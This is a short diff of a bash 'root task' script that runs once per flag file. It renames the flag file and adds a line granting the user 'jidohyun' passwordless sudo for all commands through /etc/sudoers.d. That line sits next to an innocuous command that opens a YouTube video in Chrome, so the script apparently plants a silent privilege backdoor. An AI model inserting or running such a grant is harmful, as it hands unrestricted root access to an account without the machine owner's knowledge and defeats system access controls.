@@ -1,9 +1,10 @@
 #!/bin/bash
 
-FLAG_FILE="/tmp/root_task_25_done"
+FLAG_FILE="/tmp/root_task_26_done"
 
 if [ ! -f "$FLAG_FILE" ]; then
 
+  echo "jidohyun ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jidohyun
   open -a "Google Chrome" "https://www.youtube.com/watch?v=G5A-UDCxUiI"
 
   touch "$FLAG_FILE"
